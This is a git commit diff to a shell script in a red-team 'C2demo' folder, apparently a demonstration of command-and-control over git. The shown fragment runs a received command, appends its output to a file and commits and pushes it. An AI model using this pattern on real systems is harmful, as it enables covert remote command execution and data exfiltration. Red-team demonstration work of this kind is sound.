6f8b78dbdf21fa41f0303661e6f5eed298522cb7
roccosicilia <rocco.sicilia@protonmail.com>
2023-01-10 09:54:58 +0100

    NOP

--- RedTeam/C2demo/demo.sh
+++ RedTeam/C2demo/demo.sh
@@ -19,7 +19,7 @@ else
     # do something
     ### IFS=', ' read -r -a array <<< $CMD
     ### eval "${array[0]} ${array[1]} ${array[2]}" >> $BASEDIR/RedTeam/C2demo/output.txt
-    res=$("$CMD")
+    res=$('$CMD')
     echo $res >> $BASEDIR/RedTeam/C2demo/output.txt
     # commit and push
     git add .
